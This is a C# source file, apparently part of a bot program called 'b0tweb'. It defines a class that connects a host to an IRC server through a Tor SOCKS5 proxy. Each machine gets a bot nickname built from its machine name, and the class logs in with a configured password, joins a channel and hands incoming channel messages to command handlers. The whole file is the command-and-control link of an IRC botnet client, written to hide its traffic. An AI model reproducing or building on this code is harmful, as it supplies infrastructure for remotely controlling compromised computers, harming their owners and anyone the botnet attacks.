﻿using System;
using b0tweb.MessageHandlers;
using Meebey.SmartIrc4net;

namespace b0tweb
{
    /// <summary>
    /// Class <c>IRCConnectionController</c> handles the IRC connection established.
    /// The IRC connection is made via Tor to make everything as secure as possible.
    /// </summary>
    class IRCConnectionController
    {
        /// <summary>
        /// The IRC client from <c>SmartIrc4Net</c>
        /// </summary>
        private IrcClient _irc;

        /// <summary>
        /// The IRC port to use fogit r the connection.
        /// </summary>
        private const int Port = 6667;

        /// <summary>
        /// The proxy type of the Tor proxy server.
        /// </summary>
        private const ProxyType ProxyKind = ProxyType.Socks5;

        /// <summary>
        /// The Nickname of the client.
        /// </summary>
        private string _nick;

        /// <summary>
        /// The real name of the client.
        /// </summary>
        private string _realName;

        /// <summary>
        /// Construct a new <c>IRCConnectionController</c>.
        /// </summary>
        public IRCConnectionController()
        {
            Random rand = new Random();
            this._irc = new IrcClient();

            this._nick = "bot_" + Environment.MachineName + "_" + rand.Next(0, 1000).ToString();
            this._realName = this._nick + "_real";

            this._irc.ProxyHost = TorProxy.Host;
            this._irc.ProxyPort = TorProxy.Port;
            this._irc.ProxyType = IRCConnectionController.ProxyKind;
        }

        /// <summary>
        /// Gets the IRC nickname for this client.
        /// </summary>
        public String Nick
        {
            get
            {
                return this._nick;
            }
        }

        /// <summary>
        /// Gets the IRC real name for this client.
        /// </summary>
        public String RealName
        {
            get
            {
                return this._realName;
            }
        }

        /// <summary>
        /// Binds the <c>OnChannelMessage</c> event handler to the <c>callback</c> given.
        /// </summary>
        /// <param name="callback">The event handler to execute on a channel message receive.</param>
        public void AddMessageHandler(AbstractMessageHandler messageHandler)
        {
            this._irc.OnChannelMessage += messageHandler.GetHandler(); ;
        }

        /// <summary>
        /// Joins a channel given by the <c>channel</c> parameter.
        /// </summary>
        /// <param name="channel">The channel to join.</param>
        public void Join(string channel)
        {
            this._irc.Connect(Configuration.IRCServer, IRCConnectionController.Port);
            this._irc.Login(this._nick, this._realName, 0, "", Configuration.IRCPassword);
            this._irc.RfcJoin(channel);
        }

        /// <summary>
        /// Listen to incoming events from the IRC server.
        /// </summary>
        public void Listen()
        {
            this._irc.Listen();
        }
    }
}
